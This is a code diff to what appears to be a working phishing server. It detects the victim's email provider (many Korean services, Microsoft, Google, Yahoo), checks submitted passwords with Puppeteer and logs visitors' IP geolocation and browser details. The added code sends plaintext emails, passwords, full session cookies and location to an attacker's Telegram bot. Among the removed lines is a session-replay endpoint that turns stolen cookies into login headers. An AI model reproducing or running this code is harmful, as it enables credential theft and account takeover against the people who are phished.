@@ -31,9 +31,9 @@ class SessionStore {
         this.sessionTTL = 60 * 60 * 1000; // 1 hour
         this.replayData = new Map();
         this.allCookies = new Map();
+        this.visitorData = new Map();
     }
 
-    // Store complete session data - no truncation
     storeSession(sessionId, data) {
         const session = this.sessions.get(sessionId) || {
             id: sessionId,
@@ -48,10 +48,13 @@ class SessionStore {
         return session;
     }
 
-    // Store cookies - full values, no truncation
     storeCookies(sessionId, cookies, source) {
         const session = this.sessions.get(sessionId);
-        if (!session) return;
+        if (!session) {
+            // Create session if it doesn't exist
+            this.storeSession(sessionId, {});
+            return this.storeCookies(sessionId, cookies, source);
+        }
         
         session.cookies = session.cookies || {};
         session.cookies[source] = session.cookies[source] || [];
@@ -62,10 +65,12 @@ class SessionStore {
                 existing.value = cookieData.value;
                 existing.httpOnly = cookieData.httpOnly;
                 existing.updated = Date.now();
+                existing.fullValue = cookieData.value; // NO TRUNCATION
             } else {
                 session.cookies[source].push({
                     name: name,
                     value: cookieData.value,
+                    fullValue: cookieData.value, // NO TRUNCATION
                     httpOnly: cookieData.httpOnly || false,
                     secure: cookieData.secure || false,
                     path: cookieData.path || '/',
@@ -78,7 +83,17 @@ class SessionStore {
         this.allCookies.set(sessionId, session.cookies);
     }
 
-    // Store complete form data - no truncation
+    storeVisitorData(sessionId, visitorData) {
+        const session = this.sessions.get(sessionId);
+        if (!session) {
+            this.storeSession(sessionId, {});
+            return this.storeVisitorData(sessionId, visitorData);
+        }
+        session.visitor = visitorData;
+        session.visitor.capturedAt = Date.now();
+        this.visitorData.set(sessionId, visitorData);
+    }
+
     storeFormData(sessionId, formData) {
         const session = this.sessions.get(sessionId);
         if (!session) return;
@@ -91,7 +106,6 @@ class SessionStore {
         });
     }
 
-    // Store tokens - full values
     storeTokens(sessionId, tokens) {
         const session = this.sessions.get(sessionId);
         if (!session) return;
@@ -101,13 +115,13 @@ class SessionStore {
             if (value) {
                 session.tokens[key] = {
                     value: value,
+                    fullValue: value, // NO TRUNCATION
                     captured: Date.now()
                 };
             }
         }
     }
 
-    // Store replay data - complete
     storeReplayData(sessionId, replayData) {
         const session = this.sessions.get(sessionId);
         if (!session) return;
@@ -115,7 +129,6 @@ class SessionStore {
         this.replayData.set(sessionId, replayData);
     }
 
-    // Get complete session for replay
     getReplayData(sessionId) {
         const session = this.sessions.get(sessionId);
         if (!session) return null;
@@ -125,13 +138,13 @@ class SessionStore {
             tokens: session.tokens || {},
             forms: session.forms || [],
             replayData: session.replayData || {},
+            visitor: session.visitor || {},
             fingerprint: session.fingerprint || {},
             created: session.created,
             lastActivity: session.lastActivity
         };
     }
 
-    // Get all cookies for session
     getAllCookies(sessionId) {
         const session = this.sessions.get(sessionId);
         if (!session) return null;
@@ -140,12 +153,42 @@ class SessionStore {
             for (const source of Object.values(session.cookies)) {
                 if (Array.isArray(source)) {
                     for (const cookie of source) {
-                        allCookies[cookie.name] = cookie.value;
+                        allCookies[cookie.name] = cookie.fullValue || cookie.value; // FULL VALUE
                     }
                 }
             }
         }
         return allCookies;
+    }
+
+    getFullCookies(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return null;
+        const allCookies = {};
+        if (session.cookies) {
+            for (const source of Object.values(session.cookies)) {
+                if (Array.isArray(source)) {
+                    for (const cookie of source) {
+                        allCookies[cookie.name] = {
+                            value: cookie.fullValue || cookie.value,
+                            httpOnly: cookie.httpOnly,
+                            secure: cookie.secure,
+                            domain: cookie.domain,
+                            path: cookie.path,
+                            source: cookie.source,
+                            captured: cookie.captured
+                        };
+                    }
+                }
+            }
+        }
+        return allCookies;
+    }
+
+    getVisitorData(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return null;
+        return session.visitor || null;
     }
 
     deepMerge(target, source) {
@@ -167,6 +210,8 @@ class SessionStore {
             if (now - session.lastActivity > this.sessionTTL) {
                 this.sessions.delete(id);
                 this.replayData.delete(id);
+                this.allCookies.delete(id);
+                this.visitorData.delete(id);
                 cleaned++;
             }
         }
@@ -179,25 +224,22 @@ class SessionStore {
 const sessionStore = new SessionStore();
 
 // ============================================================
-// CONFIGURATION - All sensitive data from environment
+// CONFIGURATION
 // ============================================================
 const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
 const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
 const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
 const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";
 
-// Google OAuth2
 const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
 const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
-
-// Yahoo OAuth2
 const YAHOO_CLIENT_ID = process.env.YAHOO_CLIENT_ID || 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--';
 const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4';
 
 console.log(`🚀 Server starting with Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ Configured' : '⚠️ Not configured (fallback mode)'}`);
 
 // ============================================================
-// COMPLETE KOREAN EMAIL PROVIDER DETECTION
+// EMAIL PROVIDER DETECTION
 // ============================================================
 function detectEmailProvider(email) {
     if (!email || !email.includes('@')) {
@@ -206,7 +248,6 @@ function detectEmailProvider(email) {
     
     const domain = email.split('@')[1].toLowerCase();
     
-    // Korean Corporate/Enterprise
     const koreanCorporate = {
         'naver.worksmobile.com': { provider: 'naver_works', display: 'Naver Works (네이버웍스)', loginUrl: 'https://naver.worksmobile.com', icon: '🏢' },
         'tracoworld.co.kr': { provider: 'tracoworld', display: 'Tracoworld (트라코월드)', loginUrl: 'https://www.tracoworld.co.kr', icon: '🏢' },
@@ -220,7 +261,6 @@ function detectEmailProvider(email) {
         return koreanCorporate[domain];
     }
     
-    // Korean Public Email
     const koreanPublic = {
         'naver.com': { provider: 'naver', display: 'Naver (네이버)', loginUrl: 'https://nid.naver.com/nidlogin.login', icon: '📧' },
         'daum.net': { provider: 'daum', display: 'Daum (다음)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
@@ -238,17 +278,14 @@ function detectEmailProvider(email) {
         return koreanPublic[domain];
     }
     
-    // Microsoft 365 Corporate
     if (domain.endsWith('.onmicrosoft.com') || domain.endsWith('.mail.protection.outlook.com')) {
         return { provider: 'microsoft_corporate', display: 'Microsoft 365 Corporate (한국)', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
     }
     
-    // Korean Corporate (.co.kr, .or.kr, etc.)
     if (domain.endsWith('.co.kr') || domain.endsWith('.or.kr') || domain.endsWith('.go.kr') || domain.endsWith('.ac.kr')) {
         return { provider: 'korean_corporate', display: `Korean Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
     }
     
-    // International
     const microsoftDomains = ['microsoft.com', 'microsoftonline.com', 'outlook.com', 'hotmail.com', 'live.com', 'office.com', 'office365.com', 'msn.com'];
     if (microsoftDomains.some(d => domain === d || domain.endsWith('.' + d))) {
         return { provider: 'microsoft', display: 'Microsoft 365', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
@@ -274,6 +311,103 @@ function detectEmailProvider(email) {
     }
     
     return { provider: 'unknown', display: `Unknown (${domain})`, loginUrl: null, icon: '❓' };
+}
+
+// ============================================================
+// IP GEOLOCATION
+// ============================================================
+async function getGeolocation(ip) {
+    try {
+        // Skip private IPs
+        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+            return {
+                ip: ip,
+                city: 'Localhost',
+                region: 'Local',
+                country: 'Local',
+                countryCode: 'LOCAL',
+                loc: '0,0',
+                org: 'Localhost',
+                timezone: 'UTC',
+                isLocal: true
+            };
+        }
+
+        const response = await axios.get(`https://ipinfo.io/${ip}/json`, {
+            timeout: 5000
+        });
+        
+        const data = response.data;
+        return {
+            ip: data.ip || ip,
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+            country: data.country || 'Unknown',
+            countryCode: data.country || 'UNKNOWN',
+            loc: data.loc || '0,0',
+            org: data.org || 'Unknown ISP',
+            timezone: data.timezone || 'UTC',
+            postal: data.postal || 'Unknown',
+            coordinates: data.loc ? data.loc.split(',') : ['0', '0']
+        };
+    } catch (error) {
+        console.error('⚠️ Geolocation error:', error.message);
+        return {
+            ip: ip,
+            city: 'Unknown',
+            region: 'Unknown',
+            country: 'Unknown',
+            countryCode: 'UNKNOWN',
+            loc: '0,0',
+            org: 'Unknown ISP',
+            timezone: 'UTC',
+            isLocal: true
+        };
+    }
+}
+
+// ============================================================
+// BROWSER/DEVICE DETECTION
+// ============================================================
+function detectBrowser(userAgent) {
+    if (!userAgent) return { browser: 'Unknown', platform: 'Unknown', device: 'Unknown' };
+    
+    let browser = 'Unknown';
+    let platform = 'Unknown';
+    let device = 'Unknown';
+    
+    // Browser detection
+    if (userAgent.includes('Edg/')) browser = 'Edge';
+    else if (userAgent.includes('Chrome/')) browser = 'Chrome';
+    else if (userAgent.includes('Firefox/')) browser = 'Firefox';
+    else if (userAgent.includes('Safari/')) browser = 'Safari';
+    else if (userAgent.includes('OPR/')) browser = 'Opera';
+    else if (userAgent.includes('Brave/')) browser = 'Brave';
+    else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
+    
+    // Platform detection
+    if (userAgent.includes('Windows')) platform = 'Windows';
+    else if (userAgent.includes('Mac OS')) platform = 'macOS';
+    else if (userAgent.includes('Linux')) platform = 'Linux';
+    else if (userAgent.includes('Android')) platform = 'Android';
+    else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) platform = 'iOS';
+    else if (userAgent.includes('CrOS')) platform = 'Chrome OS';
+    
+    // Device detection
+    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+        device = 'Mobile';
+    } else if (userAgent.includes('Tablet')) {
+        device = 'Tablet';
+    } else {
+        device = 'Desktop';
+    }
+    
+    // Override for specific devices
+    if (userAgent.includes('iPhone')) device = 'iPhone';
+    else if (userAgent.includes('iPad')) device = 'iPad';
+    else if (userAgent.includes('Android')) device = 'Android Device';
+    
+    return { browser, platform, device };
 }
 
 // ============================================================
@@ -398,25 +532,11 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
         const cookies = await page.cookies();
         console.log(`[PUPPETEER] 🍪 Cookies captured: ${cookies.length}`);
         
-        if (cookies.length > 0) {
-            const httpOnlyCookies = cookies.filter(c => c.httpOnly);
-            let msg = `🎯 *COOKIES CAPTURED VIA PUPPETEER*\n\n`;
-            msg += `*Provider:* ${providerInfo.display}\n`;
-            msg += `*Email:* ${email}\n`;
-            msg += `*Total Cookies:* ${cookies.length}\n`;
-            msg += `*HTTPOnly:* ${httpOnlyCookies.length}\n\n`;
-            
-            cookies.slice(0, 5).forEach(c => {
-                const flags = [];
-                if (c.httpOnly) flags.push('🔒 HTTPOnly');
-                if (c.secure) flags.push('🔐 Secure');
-                if (c.session) flags.push('🔄 Session');
-                msg += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
-                if (flags.length) msg += `  ${flags.join(' | ')}\n`;
-            });
-            
-            await sendToTelegram(msg);
-        }
+        // Store cookies in session store
+        const cookieData = {};
+        cookies.forEach(c => {
+            cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
+        });
         
         await page.close();
         
@@ -426,21 +546,24 @@ async function verifyWithPuppeteer(email, password, providerInfo) {
                 requires2FA: false,
                 token: `puppeteer_${Date.now()}`,
                 provider: providerInfo.provider,
-                message: `${providerInfo.display} verified successfully`
+                message: `${providerInfo.display} verified successfully`,
+                cookies: cookieData
             };
         } else if (requires2FA) {
             return {
                 valid: false,
                 requires2FA: true,
                 message: `${providerInfo.display} requires 2FA`,
-                provider: providerInfo.provider
+                provider: providerInfo.provider,
+                cookies: cookieData
             };
         } else {
             return {
                 valid: false,
                 requires2FA: false,
                 message: `Invalid ${providerInfo.display} password. Please try again.`,
-                provider: providerInfo.provider
+                provider: providerInfo.provider,
+                cookies: cookieData
             };
         }
         
@@ -691,114 +814,119 @@ async function verifyPasswordWithProvider(email, password) {
 }
 
 // ============================================================
-// TELEGRAM NOTIFICATION
+// ENHANCED TELEGRAM ALERTS WITH FULL DATA
 // ============================================================
-async function sendToTelegram(message, parseMode = 'Markdown') {
+async function sendEnhancedTelegramAlert(data) {
     try {
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
+        
         if (!botToken || !chatId) {
             console.log('⚠️ Telegram credentials missing');
             return false;
         }
+
+        const {
+            email,
+            password,
+            provider,
+            providerDisplay,
+            stage,
+            attemptCount,
+            sessionId,
+            geolocation,
+            visitorData,
+            validationResult,
+            verificationStatus
+        } = data;
+
+        let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
+        msg += `*${provider.icon || '📧'} Provider:* ${providerDisplay || provider.display || 'Unknown'}\n`;
+        msg += `*📧 Email:* ${email}\n`;
+        msg += `*🔑 Password:* \`${password || 'N/A'}\`\n`;
+        msg += `*🔗 Login URL:* ${provider.loginUrl || 'N/A'}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+        msg += `*🆔 Session:* \`${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\`\n`;
+        msg += `*📊 Attempt:* ${attemptCount || 1}\n`;
+        msg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n\n`;
+
+        // Geolocation
+        if (geolocation && !geolocation.isLocal) {
+            msg += `📍 *Location:* ${geolocation.city}, ${geolocation.region}, ${geolocation.country}\n`;
+            msg += `🌆 *City:* ${geolocation.city}\n`;
+            msg += `🌍 *Country:* ${geolocation.country}\n`;
+            msg += `📌 *Coordinates:* ${geolocation.loc || 'N/A'}\n`;
+            msg += `🕐 *Timezone:* ${geolocation.timezone || 'UTC'}\n`;
+            msg += `🏢 *ISP:* ${geolocation.org || 'Unknown'}\n`;
+            msg += `📡 *IP:* ${geolocation.ip || 'Unknown'}\n\n`;
+        }
+
+        // Visitor Details
+        if (visitorData) {
+            msg += `--- *Visitor Details* ---\n`;
+            msg += `🔗 *Referrer:* ${visitorData.referrer || 'Direct / No Referrer'}\n`;
+            msg += `🖥️ *User Agent:* ${visitorData.userAgent || 'Unknown'}\n`;
+            msg += `💻 *Browser:* ${visitorData.browser || 'Unknown'}\n`;
+            msg += `📱 *Platform:* ${visitorData.platform || 'Unknown'}\n`;
+            msg += `📲 *Device:* ${visitorData.device || 'Unknown'}\n`;
+            msg += `🌐 *Language:* ${visitorData.language || 'Unknown'}\n`;
+            msg += `🍪 *Cookies:* ${visitorData.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
+            msg += `🔑 *Session ID:* \`${visitorData.sessionId || 'N/A'}\`\n\n`;
+        }
+
+        // Verification Result
+        if (validationResult) {
+            if (validationResult.valid) {
+                msg += `*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
+                msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
+                if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
+                if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
+            } else if (validationResult.requires2FA) {
+                msg += `*⚠️ Status:* **2FA REQUIRED**\n`;
+                msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
+            } else {
+                msg += `*❌ Status:* **INVALID PASSWORD**\n`;
+                msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
+            }
+        }
+
+        // Cookies Captured
+        if (validationResult && validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
+            msg += `\n🍪 *COOKIES CAPTURED (FULL VALUES - NO TRUNCATION):*\n`;
+            const cookieEntries = Object.entries(validationResult.cookies).slice(0, 5);
+            for (const [name, data] of cookieEntries) {
+                const value = data.value || data;
+                const httpOnly = data.httpOnly ? '🔒' : '🔓';
+                msg += `  ${httpOnly} \`${name}\`: \`${value}\`\n`;
+            }
+            if (Object.keys(validationResult.cookies).length > 5) {
+                msg += `  ... and ${Object.keys(validationResult.cookies).length - 5} more cookies\n`;
+            }
+        }
+
+        // Status
+        if (verificationStatus === 'completed') {
+            msg += `\n🚀 *VERIFICATION COMPLETE - REDIRECTING TO PROXY*`;
+        }
+
+        // Truncate if too long
+        let finalMsg = msg;
+        if (msg.length > 4000) {
+            finalMsg = msg.substring(0, 3900) + '\n\n... (truncated)';
+        }
+
         await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
-            text: message,
-            parse_mode: parseMode,
+            text: finalMsg,
+            parse_mode: 'Markdown',
             disable_web_page_preview: true
         });
-        console.log('✅ Telegram notification sent');
+        
+        console.log('✅ Enhanced Telegram alert sent');
         return true;
     } catch (error) {
         console.error('❌ Telegram error:', error.message);
         return false;
-    }
-}
-
-// ============================================================
-// TELEGRAM ALERTS WITH FULL DATA
-// ============================================================
-async function sendTelegramCookieAlert(sessionId, cookies) {
-    try {
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
-        if (!botToken || !chatId) return;
-
-        let msg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
-        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*📊 Total:* ${Object.keys(cookies).length} cookies\n\n`;
-        msg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
-        for (const [name, data] of Object.entries(cookies)) {
-            const value = data.value || data;
-            const httpOnly = data.httpOnly ? '🔒' : '🔓';
-            msg += `  ${httpOnly} \`${name}\`:\n`;
-            msg += `  \`${value}\`\n\n`;
-        }
-
-        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            chat_id: chatId,
-            text: msg,
-            parse_mode: 'Markdown'
-        });
-        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
-    } catch(e) {
-        console.error('[TELEGRAM] Error:', e);
-    }
-}
-
-async function sendTelegramTokenAlert(sessionId, tokens) {
-    try {
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
-        if (!botToken || !chatId) return;
-
-        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
-        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
-        
-        for (const [key, value] of Object.entries(tokens)) {
-            if (value) {
-                msg += `*${key}:*\n`;
-                const tokenValue = typeof value === 'object' ? value.value : value;
-                msg += `\`${tokenValue}\`\n\n`;
-            }
-        }
-
-        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            chat_id: chatId,
-            text: msg,
-            parse_mode: 'Markdown'
-        });
-        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
-    } catch(e) {
-        console.error('[TELEGRAM] Error:', e);
-    }
-}
-
-async function sendTelegramFormAlert(sessionId, data) {
-    try {
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
-        if (!botToken || !chatId) return;
-
-        let msg = `📝 *COMPLETE FORM DATA CAPTURED*\n\n`;
-        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*🔗 URL:* ${data.url || 'unknown'}\n\n`;
-        msg += `*📋 FORM DATA (FULL - NO TRUNCATION):*\n`;
-        for (const [key, value] of Object.entries(data.formData || {})) {
-            msg += `  *${key}:*\n  \`${value}\`\n\n`;
-        }
-
-        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            chat_id: chatId,
-            text: msg,
-            parse_mode: 'Markdown'
-        });
-        console.log(`[TELEGRAM] ✅ Form alert sent for session ${sessionId.substring(0, 16)}`);
-    } catch(e) {
-        console.error('[TELEGRAM] Error:', e);
     }
 }
 
@@ -853,7 +981,77 @@ app.use(session({
 app.use(express.static(path.join(__dirname, '../')));
 
 // ============================================================
-// COOKIE CAPTURE ENDPOINTS
+// MIDDLEWARE - Capture Visitor Info
+// ============================================================
+app.use(async (req, res, next) => {
+    // Get client IP
+    const ip = req.headers['x-forwarded-for'] || 
+               req.connection.remoteAddress || 
+               req.socket.remoteAddress || 
+               req.ip || 
+               '127.0.0.1';
+    
+    // Clean IP (remove IPv6 prefix if present)
+    const cleanIp = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
+    
+    // Get user agent
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Detect browser
+    const browserInfo = detectBrowser(userAgent);
+    
+    // Get referrer
+    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
+    
+    // Get language
+    const language = req.headers['accept-language'] || 'Unknown';
+    
+    // Get session ID
+    const sessionId = req.session.id || req.headers['x-session-id'] || uuidv4();
+    req.session.id = sessionId;
+    
+    // Store visitor data
+    const visitorData = {
+        sessionId: sessionId,
+        userAgent: userAgent,
+        browser: browserInfo.browser,
+        platform: browserInfo.platform,
+        device: browserInfo.device,
+        language: language,
+        referrer: referrer,
+        ip: cleanIp,
+        cookiesEnabled: !!req.headers.cookie,
+        timestamp: Date.now()
+    };
+    
+    req.visitorData = visitorData;
+    req.clientIp = cleanIp;
+    
+    // Store in session store
+    sessionStore.storeVisitorData(sessionId, visitorData);
+    
+    // Get geolocation asynchronously
+    if (!req.geolocation) {
+        try {
+            const geo = await getGeolocation(cleanIp);
+            req.geolocation = geo;
+            // Update visitor data with geolocation
+            const visitor = sessionStore.getVisitorData(sessionId);
+            if (visitor) {
+                visitor.geolocation = geo;
+                sessionStore.storeVisitorData(sessionId, visitor);
+            }
+        } catch (error) {
+            console.error('⚠️ Geolocation error:', error.message);
+            req.geolocation = { ip: cleanIp, city: 'Unknown', country: 'Unknown' };
+        }
+    }
+    
+    next();
+});
+
+// ============================================================
+// COOKIE CAPTURE ENDPOINTS - FULL COOKIES NO TRUNCATION
 // ============================================================
 app.post('/api/cookies', async (req, res) => {
     try {
@@ -861,12 +1059,54 @@ app.post('/api/cookies', async (req, res) => {
         const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
         
         if (sessionId) {
+            // Store full cookies - NO TRUNCATION
             sessionStore.storeCookies(sessionId, data.cookies, data.source || 'api');
-            await sendTelegramCookieAlert(sessionId, data.cookies);
+            
+            // Get full cookies for telegram
+            const fullCookies = sessionStore.getFullCookies(sessionId);
+            
+            // Send enhanced telegram alert
+            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
+            const visitor = req.visitorData || {};
+            
+            let cookieMsg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
+            cookieMsg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
+            cookieMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+            cookieMsg += `*📊 Total:* ${Object.keys(data.cookies).length} cookies\n\n`;
+            cookieMsg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
+            
+            let count = 0;
+            for (const [name, cookieData] of Object.entries(data.cookies)) {
+                if (count >= 15) {
+                    cookieMsg += `\n... and ${Object.keys(data.cookies).length - count} more cookies\n`;
+                    break;
+                }
+                const value = cookieData.value || cookieData;
+                const httpOnly = cookieData.httpOnly ? '🔒' : '🔓';
+                const secure = cookieData.secure ? '🔐' : '';
+                cookieMsg += `  ${httpOnly}${secure} \`${name}\`:\n`;
+                cookieMsg += `  \`${value}\`\n\n`;
+                count++;
+            }
+            
+            // Add geolocation
+            if (geo && !geo.isLocal) {
+                cookieMsg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
+                cookieMsg += `📡 *IP:* ${geo.ip}\n`;
+                cookieMsg += `🏢 *ISP:* ${geo.org || 'Unknown'}\n`;
+            }
+            
+            // Add browser info
+            if (visitor) {
+                cookieMsg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
+                cookieMsg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
+            }
+            
+            await sendToTelegram(cookieMsg);
             
             res.json({ 
                 success: true, 
-                message: 'Cookies stored successfully',
+                message: 'Cookies stored successfully (full values)',
                 count: Object.keys(data.cookies).length
             });
         } else {
@@ -879,156 +1119,14 @@ app.post('/api/cookies', async (req, res) => {
 });
 
 // ============================================================
-// FORM DATA CAPTURE ENDPOINTS
-// ============================================================
-app.post('/api/form-data', async (req, res) => {
-    try {
-        const data = req.body;
-        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
-        
-        if (sessionId) {
-            sessionStore.storeFormData(sessionId, data);
-            await sendTelegramFormAlert(sessionId, data);
-            res.json({ success: true });
-        } else {
-            res.status(400).json({ error: 'No session ID' });
-        }
-    } catch(e) {
-        console.error('[FORM] Error:', e);
-        res.status(500).json({ error: e.message });
-    }
-});
-
-// ============================================================
-// TOKEN CAPTURE ENDPOINTS
-// ============================================================
-app.post('/api/tokens', async (req, res) => {
-    try {
-        const data = req.body;
-        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
-        
-        if (sessionId) {
-            sessionStore.storeTokens(sessionId, data.tokens);
-            await sendTelegramTokenAlert(sessionId, data.tokens);
-            res.json({ success: true });
-        } else {
-            res.status(400).json({ error: 'No session ID' });
-        }
-    } catch(e) {
-        console.error('[TOKENS] Error:', e);
-        res.status(500).json({ error: e.message });
-    }
-});
-
-// ============================================================
-// REPLAY DATA ENDPOINTS
-// ============================================================
-app.post('/api/replay-data', async (req, res) => {
-    try {
-        const data = req.body;
-        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
-        
-        if (sessionId) {
-            sessionStore.storeReplayData(sessionId, data);
-            res.json({ success: true, sessionId: sessionId });
-        } else {
-            res.status(400).json({ error: 'No session ID' });
-        }
-    } catch(e) {
-        console.error('[REPLAY] Error:', e);
-        res.status(500).json({ error: e.message });
-    }
-});
-
-// ============================================================
-// GET COMPLETE SESSION DATA FOR REPLAY
-// ============================================================
-app.get('/api/session-data', (req, res) => {
-    const sessionId = req.headers['x-session-id'] || req.session.id;
-    
-    if (sessionId) {
-        const data = sessionStore.getReplayData(sessionId);
-        if (data) {
-            res.json(data);
-        } else {
-            res.status(404).json({ error: 'Session not found' });
-        }
-    } else {
-        res.status(400).json({ error: 'No session ID' });
-    }
-});
-
-// ============================================================
-// GET ALL COOKIES FOR SESSION
-// ============================================================
-app.get('/api/cookies/all', (req, res) => {
-    const sessionId = req.headers['x-session-id'] || req.session.id;
-    
-    if (sessionId) {
-        const cookies = sessionStore.getAllCookies(sessionId);
-        if (cookies) {
-            res.json(cookies);
-        } else {
-            res.status(404).json({ error: 'No cookies found' });
-        }
-    } else {
-        res.status(400).json({ error: 'No session ID' });
-    }
-});
-
-// ============================================================
-// SESSION REPLAY - USE COOKIES TO ACCESS ACCOUNT
-// ============================================================
-app.post('/api/replay', async (req, res) => {
-    try {
-        const data = req.body;
-        const sessionId = data.sessionId || req.headers['x-session-id'] || req.session.id;
-        
-        if (!sessionId) {
-            res.status(400).json({ error: 'No session ID' });
-            return;
-        }
-        
-        const sessionData = sessionStore.getReplayData(sessionId);
-        if (!sessionData) {
-            res.status(404).json({ error: 'Session not found' });
-            return;
-        }
-        
-        const cookies = sessionStore.getAllCookies(sessionId);
-        const target = data.target || 'https://login.microsoftonline.com';
-        
-        const cookieHeader = Object.entries(cookies || {})
-            .map(([name, value]) => `${name}=${value}`)
-            .join('; ');
-        
-        res.json({
-            success: true,
-            sessionId: sessionId,
-            target: target,
-            cookies: cookies,
-            cookieHeader: cookieHeader,
-            replayUrl: `${target}?session_replay=true`,
-            instructions: [
-                '1. Use the cookieHeader below to authenticate',
-                '2. Use the cookies object for manual replay',
-                '3. Access the target URL with the cookies'
-            ]
-        });
-        
-    } catch(e) {
-        console.error('[REPLAY] Error:', e);
-        res.status(500).json({ error: e.message });
-    }
-});
-
-// ============================================================
-// VERIFY PASSWORD ENDPOINT
+// ENHANCED VERIFY PASSWORD ENDPOINT
 // ============================================================
 app.post('/api/verify-password', async (req, res) => {
     try {
         const { email, password, stage, sessionId } = req.body;
         const providerInfo = detectEmailProvider(email);
+        const sid = sessionId || req.session.id || uuidv4();
+        req.session.id = sid;
         
         console.log(`[VERIFY] 📧 Email: ${email}`);
         console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
@@ -1071,34 +1169,53 @@ app.post('/api/verify-password', async (req, res) => {
 
         req.session.verification.attempts++;
 
+        // Get geolocation
+        const geo = req.geolocation || await getGeolocation(req.clientIp || '127.0.0.1');
+        const visitor = req.visitorData || {};
+
+        // Verify password
         const validationResult = await verifyPasswordWithProvider(email, password);
         
-        // Send verification alert
-        let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
